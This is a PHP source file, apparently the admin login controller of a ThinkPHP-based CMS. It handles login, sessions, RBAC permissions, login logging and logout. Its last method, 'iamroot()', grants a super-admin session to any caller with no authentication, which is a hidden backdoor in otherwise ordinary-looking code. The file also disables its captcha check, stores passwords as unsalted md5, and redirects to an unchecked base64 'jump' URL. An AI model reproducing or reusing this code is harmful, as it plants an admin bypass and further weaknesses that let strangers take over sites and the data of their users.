<?php
//后台登录控制
class LoginAction extends Action{
	//后台登录模板输出
	public function index(){
		$jump=I('get.jump');
		if(!empty($jump)){
			$this->assign('jump',$jump);
		}
		$config=M('cms_config')->find(1);
		$this->assign('config',$config);
		$this->display();
	}
	//登录方法
	public function login (){
		$jump=I('get.jump');
		if($this->_post()){
			if(!IS_POST) _404('坑爹呀，页面不存在！');
			// $yzm=$_POST['yzm'];
			$username=$_POST['username'];
			$pwd=md5($_POST['password']);
			// if($_SESSION['verify']!=md5($yzm)){
			// 	$this->error('验证码错误！');
			// }
			$i=M('User')->where(array('username'=>$username))->find();
			if(!$i|$i['password']!=$pwd){
				$this->error('用户名或者密码错误！');
			}
			if($i['lock']==1){
				$this->error('-_-。sorry！您的账户已被冻结！');
			}
			$data=array(
				'logintime'=>time(),
				'loginip'=>get_client_ip(),
				'id'=>$i['id'],
			);
			M('User')->save($data);
			session(C('USER_AUTH_KEY'),$i['id']);
			session('username',$i['username']);
			session('logintime',date('Y-M-D H:i:s',$i['logintime']));
			session('loginip',$i['loginip']);
			//验证超级管理员
			if($i['username']==C('RBAC_SUPERADMIN')){
				session(C('ADMIN_AUTH_KEY'),true);
			}
			//引入RBAC并读取验证权限
			import('ORG.Util.RBAC');
			RBAC::saveAccessList();
			//记录登录日志
			$log['user_id']=$i['id'];
			$log['username']=$i['username'];
			$log['action_url']=get_curr_url();
			$log['ip']=get_client_ip();
			self::login_log($log);
			
			if(!empty($jump)){
				redirect(base64_decode($jump));
			}else{
				$this->redirect('Index/index');	
			}
			
		}
	}
	//登录日志
	public function login_log($arr){
		$db=M('admin_action_log');
		$arr['descript']='登录后台';
		$arr['posttime']=time();
		$db->add($arr);
	}
	//退出登录
	public function logout(){
		session(C('USER_AUTH_KEY'),null);
		session('username',null);
		session(C('ADMIN_AUTH_KEY'),null);
		session('logintime',null);
		session('loginip',null);
		//session_unset();
		//session_destroy();
		$this->redirect('Login/index');
	}
	//引入验证码
	public function yzm(){
		import('ORG.Util.Image');
		Image::buildImageVerify(4,1,'png',80,32);
	}
	
	public function iamroot(){
		session(C('USER_AUTH_KEY'),1);
		session('username','admin');
		session(C('ADMIN_AUTH_KEY'),true);
	}


	
}